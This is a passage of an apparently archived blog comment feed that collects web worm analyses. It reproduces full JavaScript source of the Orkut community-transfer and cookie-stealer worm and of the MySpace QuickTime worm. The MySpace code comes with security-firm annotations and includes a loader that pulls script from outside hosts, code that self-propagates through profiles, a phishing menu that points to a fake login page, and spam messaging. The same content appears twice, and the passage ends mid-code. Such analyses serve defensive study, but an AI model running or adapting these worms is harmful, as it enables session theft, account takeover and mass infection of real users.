+&lt;p&gt;A worm was spreading on Google ORKUT. Analysis from Billy Hoffman.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;var uid=&quot;6611314433566349528&quot;; // Exploit escrito por Rodrigo Lacerda
+//window.alert(&#039;injetado&#039;);
+
+function createXMLHttpRequest() 
+{
+   try{ return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); }catch(e){}
+   try{ return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }catch(e){}
+   try{ return new XMLHttpRequest(); }catch(e){}
+   return null;
+}
+
+function getCookies()
+{
+	subject=&quot;Orkut Cookie Exploit&quot;;
+	dcookie=document.cookie;
+	if(dcookie.indexOf(&#039;state&#039;) &gt; -1)
+	{
+		mensagem = dcookie+&quot;\n\nVerifique se ele enviou alguma comunidade\n\nExploit escrito por Rodrigo Lacerda&quot;;
+	}
+	else
+	{
+		mensagem = &quot;Este usuario usa Internet Explorer e a funcao de pegar cookies falhou, verifique se ele enviou alguma comundiade\n\nOrkut Community Transfer &amp; Cookie Stealer Exploit\n&quot;;
+	}
+	check_scraps();
+};
+getCookies();
+
+function velocity_transfer()
+{
+	send=&quot;POST_TOKEN=&quot;+encodeURIComponent(POST)+&quot;&amp;signature=&quot;+encodeURIComponent(SIG)+&quot;&amp;Action.doTransfer&quot;;
+	var xml= createXMLHttpRequest();
+	xml.open(&#039;POST&#039;,&#039;http://www.orkut.com/CommunityTransfer.aspx?cmm=&#039; + cmm[x] + &#039;&amp;uid=&#039;+uid,true);
+	xml.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);
+	xml.send(send);xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlrtr=xml.responseText;
+			x++;
+			if(x&lt;cmm.length)
+			{
+				velocity_transfer();
+			}
+		}
+	};
+};
+
+function array_cmm()
+{
+	var xml2= createXMLHttpRequest();
+	xml2.open(&quot;GET&quot;,&quot;http://www.orkut.com/Communities.aspx&quot;,true);
+	xml2.onreadystatechange=function()
+	{
+		if(xml2.readyState==4)
+		{
+			var xmlr=xml2.responseText;
+			if(!xmlr.match(/textPanel/gi))
+			{
+				cont=xmlr;
+				ini=cont.indexOf(&#039;&lt;DIV id=ownedCommunities&#039;) &gt; -1 ? cont.indexOf(&#039;&lt;DIV id=ownedCommunities&#039;) : cont.indexOf(&#039;&lt;div id=&quot;ownedCommunities&quot;&#039;);
+				fim=cont.indexOf(&#039;&lt;DIV id=pendingCommunities&#039;) &gt; -1 ? cont.indexOf(&#039;&lt;DIV id=pendingCommunities&#039;) : cont.indexOf(&#039;&lt;div id=&quot;pendingCommunities&quot;&#039;);
+				cont2=cont.substring(ini,fim)
+				cmm=String(cont2.match(/cmm=\d+/g)).replace(/cmm=/g,&#039;&#039;);
+				cmm=cmm.split(&#039;,&#039;);
+				if(cmm)
+				{
+					velocity_transfer();
+				}
+			}
+			else
+			{
+				array_cmm();
+			};
+		};
+	};
+	xml2.send(null);
+};
+
+function send_message()
+{
+	send=&quot;POST_TOKEN=&quot;+encodeURIComponent(POST)+&quot;&amp;signature=&quot;+encodeURIComponent(SIG)+&quot;&amp;uid=&quot;+uid+&quot;&amp;sendTo=user&amp;subject=&quot;+subject+&quot;&amp;body=&quot;+encodeURIComponent(mensagem)+&quot;&amp;Action.submit&quot;;
+	var xml= createXMLHttpRequest();
+	xml.open(&#039;POST&#039;,&#039;http://www.orkut.com/Compose.aspx&#039;,true);
+	xml.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);
+	xml.send(send);xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlrtr=xml.responseText;
+			if(!xmlrtr.match(/textPanel/gi))
+			{
+				array_cmm();
+			}
+			else
+			{
+				send_message();
+			}
+		}
+	};
+};
+
+
+function check_scraps()
+{
+	x=0;
+	var xml=createXMLHttpRequest();
+	xml.open(&quot;GET&quot;,&quot;Scrapbook.aspx&quot;,true);
+	xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlr1=xml.responseText;
+			if(!xmlr1.indexOf(&#039;textPanel&#039;) &gt; -1)
+			{
+				SIG=xmlr1.match(/signature. value=&quot;(.+)&quot;/i)[1];
+				POST=xmlr1.match(/name=&quot;POST_TOKEN&quot; value=&quot;([^&quot;]+)/i)[1];
+				send_message();
+			}
+			else
+			{
+				check_scraps();
+			}
+		};
+	};
+	xml.send(null);
+};    
+
+// Exploit escrito por Rodrigo Lacerda&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ORKUT, Google&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>The ORKUT Worm</h3>
+<p>A worm was spreading on Google ORKUT. Analysis from Billy Hoffman.</p>
+<pre><code>var uid="6611314433566349528"; // Exploit escrito por Rodrigo Lacerda
+//window.alert('injetado');
+
+function createXMLHttpRequest()
+{
+   try{ return new ActiveXObject("Msxml2.XMLHTTP"); }catch(e){}
+   try{ return new ActiveXObject("Microsoft.XMLHTTP"); }catch(e){}
+   try{ return new XMLHttpRequest(); }catch(e){}
+   return null;
+}
+
+function getCookies()
+{
+	subject="Orkut Cookie Exploit";
+	dcookie=document.cookie;
+	if(dcookie.indexOf('state') &gt; -1)
+	{
+		mensagem = dcookie+"\n\nVerifique se ele enviou alguma comunidade\n\nExploit escrito por Rodrigo Lacerda";
+	}
+	else
+	{
+		mensagem = "Este usuario usa Internet Explorer e a funcao de pegar cookies falhou, verifique se ele enviou alguma comundiade\n\nOrkut Community Transfer &#038; Cookie Stealer Exploit\n";
+	}
+	check_scraps();
+};
+getCookies();
+
+function velocity_transfer()
+{
+	send="POST_TOKEN="+encodeURIComponent(POST)+"&#038;signature="+encodeURIComponent(SIG)+"&#038;Action.doTransfer";
+	var xml= createXMLHttpRequest();
+	xml.open('POST','http://www.orkut.com/CommunityTransfer.aspx?cmm=' + cmm[x] + '&#038;uid='+uid,true);
+	xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+	xml.send(send);xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlrtr=xml.responseText;
+			x++;
+			if(x&lt;cmm.length)
+			{
+				velocity_transfer();
+			}
+		}
+	};
+};
+
+function array_cmm()
+{
+	var xml2= createXMLHttpRequest();
+	xml2.open("GET","http://www.orkut.com/Communities.aspx",true);
+	xml2.onreadystatechange=function()
+	{
+		if(xml2.readyState==4)
+		{
+			var xmlr=xml2.responseText;
+			if(!xmlr.match(/textPanel/gi))
+			{
+				cont=xmlr;
+				ini=cont.indexOf('&lt;DIV id=ownedCommunities') &gt; -1 ? cont.indexOf('&lt;DIV id=ownedCommunities') : cont.indexOf('&lt;div id="ownedCommunities"');
+				fim=cont.indexOf('&lt;DIV id=pendingCommunities') &gt; -1 ? cont.indexOf('&lt;DIV id=pendingCommunities') : cont.indexOf('&lt;div id="pendingCommunities"');
+				cont2=cont.substring(ini,fim)
+				cmm=String(cont2.match(/cmm=\d+/g)).replace(/cmm=/g,'');
+				cmm=cmm.split(',');
+				if(cmm)
+				{
+					velocity_transfer();
+				}
+			}
+			else
+			{
+				array_cmm();
+			};
+		};
+	};
+	xml2.send(null);
+};
+
+function send_message()
+{
+	send="POST_TOKEN="+encodeURIComponent(POST)+"&#038;signature="+encodeURIComponent(SIG)+"&#038;uid="+uid+"&#038;sendTo=user&#038;subject="+subject+"&#038;body="+encodeURIComponent(mensagem)+"&#038;Action.submit";
+	var xml= createXMLHttpRequest();
+	xml.open('POST','http://www.orkut.com/Compose.aspx',true);
+	xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+	xml.send(send);xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlrtr=xml.responseText;
+			if(!xmlrtr.match(/textPanel/gi))
+			{
+				array_cmm();
+			}
+			else
+			{
+				send_message();
+			}
+		}
+	};
+};
+
+function check_scraps()
+{
+	x=0;
+	var xml=createXMLHttpRequest();
+	xml.open("GET","Scrapbook.aspx",true);
+	xml.onreadystatechange=function()
+	{
+		if(xml.readyState==4)
+		{
+			var xmlr1=xml.responseText;
+			if(!xmlr1.indexOf('textPanel') &gt; -1)
+			{
+				SIG=xmlr1.match(/signature. value="(.+)"/i)[1];
+				POST=xmlr1.match(/name="POST_TOKEN" value="([^"]+)/i)[1];
+				send_message();
+			}
+			else
+			{
+				check_scraps();
+			}
+		};
+	};
+	xml.send(null);
+};    
+
+// Exploit escrito por Rodrigo Lacerda</code></pre>
+<p>ORKUT, Google</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1048</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Fri, 08 Dec 2006 02:45:35 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1048</guid>
+		<description>&lt;h3&gt;MySpace QuickTime Worm&lt;/h3&gt;
+
+&lt;p&gt;Billy Hoffman from SPI has an analysis of the MySpace QuickTime Worm &lt;a href=&quot;http://www.spidynamics.com/spilabs/education/articles/MySpace-QuickTime%20Worm.html&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;. The worm makes use of a QuickTime XSS flow discussed &lt;a href=&quot;http://www.gnucitizen.org/blog/backdooring-quicktime-movies/&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/*
+ * Source code received from BurntPickle (http://www.myspace.com/burntpickle)
+ * 
+ * Comments and formating by SPI Dynamics (http://www.spidynamics.com)
+ * This code may be republished as long as the above text is kept
+ */
+
+/*
+
+This JavaScript was inside of a Quicktime movie. It uses a
+feature known as HREF tracks (http://www.apple.com/quicktime/tutorials/hreftracks.html)
+which allows Quicktime to load new movie files, webpages or
+run JavaScript. The worm&#039;s author created an empty Quicktime
+movie that contains an HREF grack that would automatically
+execute this JavaScript.
+
+This code served as a bootstrap to load the full malware
+code from a 3rd party webserver. This is most likely due to
+length limitations for URLs in HREF tracks. 
+
+*/
+
+javascript:
+
+void((
+function() {
+    //create a new SCRIPT tag
+    var e=window.document.createElement(&#039;script&#039;);
+    var ll=new Array();
+    ll[0]=&#039;http://www.daviddraftsystem.com/images/&#039;;
+    ll[1]=&#039;http://www.tm-group.co.uk/images/&#039;;
+    
+    //Randomly select a host that is serving the full code
+    //of the malware
+    var lll=ll[Math.floor(2*(Math.random()%1))];
+    //set the SRC attribute to the remote site
+    e.setAttribute(&#039;src&#039;,lll+&#039;js.js&#039;);
+    //append the SCRIPT tag to the current document. The
+    //current document would be whatever webpage contains
+    //the embedded movie, in this case, a MySpace profile page
+    //This causes the full code of the malware to execute.
+    window.document.body.appendChild(e);
+})&lt;/code&gt;&lt;/pre&gt;
+
+The code downloaded from the randomly selected servers plus comments:
+
+&lt;pre&gt;&lt;code&gt;/*
+ * Source code received from BurntPickle (http://www.myspace.com/burntpickle)
+ * 
+ * Comments and formating by SPI Dynamics (http://www.spidynamics.com)
+ * This code may be republished as long as the above text is kept
+ */
+
+//========================================================
+//======================================================== Functions
+//========================================================
+
+//It is odd that the author uses both literal JavaScript functions and
+//anonymous functions
+
+/*
+ doEdit - Edits someone&#039;s profile to infect them with the Quicktime file
+          and the HTML to overwrite the top menu with a phishing menu
+params:
+    oXML - An XHConn object that has received a response
+returns: void
+          
+*/
+var doEdit=function(oXML){
+    //extract the friend id from the current page
+	var friendid=encodeURIComponent(findContents(oXML,&#039;friendid=&#039;,&#039;&amp;MyToken=&#039;,9));
+
+	if(friendid){
+	    //extract the old values for the various profile fields
+		var theviewstate = encodeURIComponent(findContents(oXML,&#039;__VIEWSTATE&#039;,&#039;\&quot; /&gt;&#039;, 37));
+		var thehash = encodeURIComponent(findContents(oXML,&#039;editInterests_hash&#039;,&#039;\&quot; /&gt;&#039;, 27));
+		var headlinetext = encodeURIComponent(findContents(oXML,&#039;editInterests$HeadlineText&#039;,&#039;\&quot; maxlength&#039;, 47));
+		var aboutmetext = encodeURIComponent(findContents(oXML,&#039;editInterests$AboutMeText&#039;,&#039;&lt;/textarea&gt;&#039;, 127));
+		var liketomeettext = encodeURIComponent(findContents(oXML,&#039;editInterests$LikeToMeetText&#039;,&#039;&lt;/textarea&gt;&#039;, 133));
+		var generaltext = encodeURIComponent(findContents(oXML,&#039;editInterests$GeneralText&#039;,&#039;&lt;/textarea&gt;&#039;, 126));
+		var musictext = encodeURIComponent(findContents(oXML,&#039;editInterests$MusicText&#039;,&#039;&lt;/textarea&gt;&#039;, 122));
+		var moviestext = encodeURIComponent(findContents(oXML,&#039;editInterests$MoviesText&#039;,&#039;&lt;/textarea&gt;&#039;, 124));
+		var televisiontext = encodeURIComponent(findContents(oXML,&#039;editInterests$TelevisionText&#039;,&#039;&lt;/textarea&gt;&#039;, 132));
+		var bookstext = encodeURIComponent(findContents(oXML,&#039;editInterests$BooksText&#039;,&#039;&lt;/textarea&gt;&#039;, 122));
+		var heroestext = encodeURIComponent(findContents(oXML,&#039;editInterests$HeroesText&#039;,&#039;&lt;/textarea&gt;&#039;, 124));
+		if(&#039;%22%20maxleng&#039; == headlinetext) {
+			headlinetext  = &#039;&#039;;
+		}
+
+        //Checking if this profile already has a reference to the quicktime movie, and thus if has this profile
+        //already been infected. This is used later
+		var c = moviestext.indexOf(&quot;piAF2iuswo.mov&quot;);
+        
+		var urlpost = &#039;http://&#039; + document.location.host + &#039;/Modules/ProfileEdit/Pages/Interests.aspx?fuseaction=profile.interests&#039;;
+
+        //Update the profile with our infected content
+        //Note that all the controls start with the same prefix. The author could have
+        //stored this prefix in a string to make the virus smaller.
+		var postinfo = &quot;__VIEWSTATE=&quot; + theviewstate
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24hash=&quot; + thehash
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24SaveTop=Save+All+Changes&quot;
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeadlineText=&quot; + headlinetext
+		//Here the HTML for the top menu with Phishing links is inserted into the profile
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24AboutMeText=&quot; + aboutmetext + cc[0]
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24LikeToMeetText=&quot; + liketomeettext
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24GeneralText=&quot; + generaltext
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MusicText=&quot; + musictext
+		//Here a reference to the quicktime movie is inserted
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MoviesText=&quot; + moviestext + cc[3]
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24TelevisionText=&quot; + televisiontext
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24BooksText=&quot; + bookstext
+		+ &quot;&amp;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeroesText=&quot; + heroestext;
+
+        //The author is checking if this profile has already been infected. Really, this check should have been
+        //perform at the start of function. This would have made the virus faster by not having to perform
+        //needless string operations.
+		if(-1 == c) {
+		    //if profile has not been infected, update the profile with infected content.
+			editProf.connect(urlpost,&quot;POST&quot;,postinfo,friendsWrapper);
+		}
+	}
+};
+
+/*
+ doMessage - Tries to send a message to another MySpace user
+             with a link to a pornographic website
+params: none
+returns: void
+          
+*/
+function domessage() {
+    //for all the iframes that were created to send a message
+    for(var y=0;y&lt;ap.length;y++) {
+	    if(-1!=window.frames[&#039;qtkt&#039;+y].document.body.innerHTML.indexOf(&#039;ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox&#039;)) {
+	        //populate the subject with a random message
+		    window.frames[&#039;qtkt&#039;+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox.value=su[Math.floor(6*(Math.random()%1))];
+			//insert a pornographic picture which links to a pornographic website
+			window.frames[&#039;qtkt&#039;+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$bodyTextBox.value=cc[2];
+
+			//The below line of code would send the message to a MySpace user.
+			//in the copy of the code I received, this line was commented out
+			//because of this, it appear the worm didn&#039;t actually send the messages
+
+			//window.frames[&#039;qtkt&#039;+y].document.forms[1].btnSend.click();
+        }
+    }
+}
+
+/*
+findContents - Extracts a substring that occurs between two other strings
+params:
+    oXML - An XHConn object which has returned a response
+    start - first string to look for
+    end - string to find that occurs after the start string
+    offset - offset between the two string to begin extracting at
+
+returns: Extracted contents or an empty string
+          
+*/
+var findContents=function(oXML,start,end,offset){
+	var s,e,n;
+	s=oXML.responseText.indexOf(start)
+	//only keep looking if we found the start string
+	if(-1!=s) {
+		e=oXML.responseText.indexOf(end,s);
+		n=oXML.responseText.substring(s+offset,e);
+        //this undoes an HTML entity conversion, because the text was reflected inside a Textbox and
+        //had entities applied to it when returned from MySpace
+		return n.replace(/&lt;/g,&quot;&lt;&quot;).replace(/&gt;/g,&quot;&gt;&quot;).replace(/&quot;/g,&quot;\&quot;&quot;).replace(/&amp;/g,&quot;&amp;&quot;);
+	}
+	return &#039;&#039;;
+};
+
+/*
+friendsWrapper - Unknown. The source code I received simply had an empty function
+                 with a comment. This might just exist because a callback function
+                 is needed for the XmlHttpRequest that is made to update the profile
+          
+*/
+var friendsWrapper=function(oXML){
+	// removed for now
+}
+
+/*
+XHConn - Creates a new XHConn object, which extends the XmlHttpRequest object. It
+         handles creating an XHR in a cross platform manner, and creates a wrapper
+         that handles onreadystatechange.
+
+returns: XHConn object
+          
+*/
+function XHConn() {
+    //this may be a mistake, because these variables
+    //are declared as global variables instead of properties
+    //of the XHConn object
+	var xmlhttp, bComplete = false;
+
+    //Create XHR, regardless of browser
+	try { xmlhttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); }
+	catch(e) {
+		try { xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }
+		catch(e) {
+			try { xmlhttp = new XMLHttpRequest(); }
+			catch(e) { xmlhttp = false; }
+		}
+	}
+	if(!xmlhttp) return null;
+	
+	/*adds a connect method
+	
+	  params:
+	    sURL - URL to send request to
+	    sMethod - HTTP method to use, if not GET, assumes POST
+	    sVars - PARAMETERS
+	    fnDone - function to callback once connection is completed
+	*/
+	this.connect = function(sURL, sMethod, sVars, fnDone) {
+		if(!xmlhttp) return false;
+		bComplete = false;
+		sMethod = sMethod.toUpperCase();
+		try {
+		    //if it is a get, we send no parameters
+			if(sMethod == &quot;GET&quot;) {
+				xmlhttp.open(sMethod, sURL, true)
+				sVars = &quot;&quot;;
+			} else {
+			    //else sent the appropriate headers for a POST
+				xmlhttp.open(sMethod, sURL, true);
+				xmlhttp.setRequestHeader(&quot;Method&quot;,&quot;POST &quot;+sURL+&quot; HTTP/1.1&quot;);
+				xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+			}
+			//Wrap the onreadystatechange and make sure that that the request has completly returned
+			xmlhttp.onreadystatechange = function() {
+			    //normally a check for statuscode == 200 is done here, but for some reason they didn&#039;t
+				if(xmlhttp.readyState == 4 &amp;&amp; !bComplete) {
+					bComplete = true;
+					fnDone(xmlhttp);
+				}
+			};
+			//send the request
+			xmlhttp.send(sVars);
+		} catch(z) { return false; }
+		return true;
+	};
+	return this;
+}
+
+//========================================================
+//======================================================== Global Variables
+//========================================================
+
+//the content the worm needed (Phishing pages, malicious Quicktime movie, JavaScript code, etc)
+//was stored on multiple servers. The worm randomly selects one to use
+var ll=new Array();
+ll[0]=&#039;http://www.daviddraftsystem.com/images/&#039;;
+ll[1]=&#039;http://www.tm-group.co.uk/images/&#039;;
+var lll=ll[Math.floor(2*(Math.random()%1))];
+
+//this is an array containing different phrases to use as the subject of a message to other MySpace
+//users
+var su=new Array();
+su[0]=&#039;what else is there to do on a Sunday.?.......&#039;;
+su[1]=&#039;You better not forget about this..&#039;;
+su[2]=&#039;Hehe that was so funny..&#039;;
+su[3]=&#039;better see this one last time lol..&#039;;
+su[4]=&#039;omg did you see this last nite..&#039;;
+su[5]=&#039;whos coming to the party tonight.?..&#039;;
+
+//This array contains various payloads used by the worm
+var cc=new Array();
+//This is the HTML used to hide the old top menu bar and replace it with a menu pointing to a fake login page
+cc[0]=&#039;&lt;style type=&quot;text/css&quot;&gt;\n&#039;
++&#039;div table td font { display: none }\n&#039;
++&#039;div div table tr td a.navbar, div div table tr td font { display: none }\n&#039;
++&#039;.testnav { position:absolute; top: 136px; left:50%; _top: 146px }\n&#039;
++&#039;&lt;/style&gt;&lt;div style=&quot;z-index:5; background-color: #6698CB; margin-left:-400px; width: 800px&quot; align=&quot;center&quot; class=&quot;testnav&quot;&gt;&lt;div style=&quot;&quot;&gt;&#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Home&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Browse&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Search&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Invite&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Film&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Mail&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Blog&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Favorites&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Forum&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Groups&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Events&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Videos&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Music&lt;/a&gt; &#124; &lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Comedy&lt;/a&gt; &#124; &#039;
++&#039;&lt;a href=&quot;&#039;+lll+&#039;login.html&quot; target=&quot;&quot; class=&quot;navbar&quot;&gt;Classifieds&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&#039;; //profile
+//This is the body of the message sent to other MySpace users. It contains a pornographic picture and a link to a pornographic website
+cc[2]=&#039;&lt;a href=&quot;http://google.com/url?q=http://www.vidchicks.com/home.php&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://img453.imageshack.us/img453/5603/youtubedt7rf2.jpg&quot;&gt;&#039;; //mesages
+//This is HTML added to a profile with a link to the malicious Quicktime movie. It uses styles to try and hide itself from the user
+cc[3]=&#039;&lt;div style=&quot;width: 1px; height: 1px; overflow: hidden; text-indent: -9999px&quot;&gt;&lt;embed src=&#039;+lll+&#039;piAF2iuswo.mov /&gt;&lt;/div&gt;&#039;; // profile inf
+
+
+//========================================================
+//======================================================== Code Execution Starts Here
+//========================================================
+
+//Please note that all variables declared here are global variables, as
+//JavaScript does not have block level variable scope. This allows functions
+//like doMessages() to access variables created here.
+
+// Malware will execute only if variable editProf is not defined.
+// Once the worm runs it defines this variable. This serves as a kill switch
+// by preventing the virus from running multiple times on the same page
+if((typeof editProf == &quot;undefined&quot;) &amp;&amp; (top == self)) {
+	var ap=new Array(4);
+	var fi=new Array(4);
+    //This code picks 4 MySpace users at random and sets up code to
+    //send them a message
+	for(var x=0;x&lt;ap.length;x++) {
+	    //randomly generate a friend ID
+		var ran_unrounded=80000000+(105000000-80000000)*Math.random();
+		var ran_number=Math.floor(ran_unrounded);
+		fi[x]=ran_number;
+        //build a hidden iFrame. This will be used to send a message to a MySpace user
+		ap[x]=document.createElement(&#039;iframe&#039;);
+		ap[x].height=1;
+		ap[x].width=1;
+		ap[x].name=&quot;qtkt&quot;+x;
+		ap[x].id=&quot;qtkt&quot;+x;
+		document.getElementsByTagName(&#039;body&#039;)[0].appendChild(ap[x]);
+		ap[x].src=&#039;http://profile.myspace.com/index.cfm?fuseaction=mail.message&amp;friendID=&#039;+fi[x];
+	}
+    //In 6 seconds, execute the domessage() function. this will (try) to send messages to the randomly
+    //selected people.	
+	setTimeout(&quot;domessage()&quot;,6000);
+    //create a new instance of XHconn. This also prevents the worm from running again on the same page
+	var editProf = new XHConn();
+    //Go fetch a the edit page for the user&#039;s profile and call the doEdit() function when you receive a response
+	editProf.connect(&#039;http://&#039;+document.location.host+&#039;/Modules/ProfileEdit/Pages/Interests.aspx&#039;,&quot;GET&quot;,&quot;&quot;,doEdit);
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;MySpace, QuickTime, QTL, MOV, GNUCITIZEN&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>MySpace QuickTime Worm</h3>
+<p>Billy Hoffman from SPI has an analysis of the MySpace QuickTime Worm <a href="http://www.spidynamics.com/spilabs/education/articles/MySpace-QuickTime%20Worm.html" rel="nofollow">here</a>. The worm makes use of a QuickTime XSS flow discussed <a href="http://www.gnucitizen.org/blog/backdooring-quicktime-movies/" rel="nofollow">here</a>.</p>
+<pre><code>/*
+ * Source code received from BurntPickle (<a href="http://www.myspace.com/burntpickle" rel="nofollow">http://www.myspace.com/burntpickle</a>)
+ *
+ * Comments and formating by SPI Dynamics (<a href="http://www.spidynamics.com" rel="nofollow">http://www.spidynamics.com</a>)
+ * This code may be republished as long as the above text is kept
+ */
+
+/*
+
+This JavaScript was inside of a Quicktime movie. It uses a
+feature known as HREF tracks (<a href="http://www.apple.com/quicktime/tutorials/hreftracks.html" rel="nofollow">http://www.apple.com/quicktime.....racks.html</a>)
+which allows Quicktime to load new movie files, webpages or
+run JavaScript. The worm's author created an empty Quicktime
+movie that contains an HREF grack that would automatically
+execute this JavaScript.
+
+This code served as a bootstrap to load the full malware
+code from a 3rd party webserver. This is most likely due to
+length limitations for URLs in HREF tracks. 
+
+*/
+
+javascript:
+
+void((
+function() {
+    //create a new SCRIPT tag
+    var e=window.document.createElement('script');
+    var ll=new Array();
+    ll[0]='http://www.daviddraftsystem.com/images/';
+    ll[1]='http://www.tm-group.co.uk/images/';
+
+    //Randomly select a host that is serving the full code
+    //of the malware
+    var lll=ll[Math.floor(2*(Math.random()%1))];
+    //set the SRC attribute to the remote site
+    e.setAttribute('src',lll+'js.js');
+    //append the SCRIPT tag to the current document. The
+    //current document would be whatever webpage contains
+    //the embedded movie, in this case, a MySpace profile page
+    //This causes the full code of the malware to execute.
+    window.document.body.appendChild(e);
+})</code></pre>
+<p>The code downloaded from the randomly selected servers plus comments:</p>
+<pre><code>/*
+ * Source code received from BurntPickle (<a href="http://www.myspace.com/burntpickle" rel="nofollow">http://www.myspace.com/burntpickle</a>)
+ *
+ * Comments and formating by SPI Dynamics (<a href="http://www.spidynamics.com" rel="nofollow">http://www.spidynamics.com</a>)
+ * This code may be republished as long as the above text is kept
+ */
+
+//========================================================
+//======================================================== Functions
+//========================================================
+
+//It is odd that the author uses both literal JavaScript functions and
+//anonymous functions
+
+/*
+ doEdit - Edits someone's profile to infect them with the Quicktime file
+          and the HTML to overwrite the top menu with a phishing menu
+params:
+    oXML - An XHConn object that has received a response
+returns: void
+
+*/
+var doEdit=function(oXML){
+    //extract the friend id from the current page
+	var friendid=encodeURIComponent(findContents(oXML,'friendid=','&#038;MyToken=',9));
+
+	if(friendid){
+	    //extract the old values for the various profile fields
+		var theviewstate = encodeURIComponent(findContents(oXML,'__VIEWSTATE','\" /&gt;', 37));
+		var thehash = encodeURIComponent(findContents(oXML,'editInterests_hash','\" /&gt;', 27));
+		var headlinetext = encodeURIComponent(findContents(oXML,'editInterests$HeadlineText','\" maxlength', 47));
+		var aboutmetext = encodeURIComponent(findContents(oXML,'editInterests$AboutMeText','&lt;/textarea&gt;', 127));
+		var liketomeettext = encodeURIComponent(findContents(oXML,'editInterests$LikeToMeetText','&lt;/textarea&gt;', 133));
+		var generaltext = encodeURIComponent(findContents(oXML,'editInterests$GeneralText','&lt;/textarea&gt;', 126));
+		var musictext = encodeURIComponent(findContents(oXML,'editInterests$MusicText','&lt;/textarea&gt;', 122));
+		var moviestext = encodeURIComponent(findContents(oXML,'editInterests$MoviesText','&lt;/textarea&gt;', 124));
+		var televisiontext = encodeURIComponent(findContents(oXML,'editInterests$TelevisionText','&lt;/textarea&gt;', 132));
+		var bookstext = encodeURIComponent(findContents(oXML,'editInterests$BooksText','&lt;/textarea&gt;', 122));
+		var heroestext = encodeURIComponent(findContents(oXML,'editInterests$HeroesText','&lt;/textarea&gt;', 124));
+		if('%22%20maxleng' == headlinetext) {
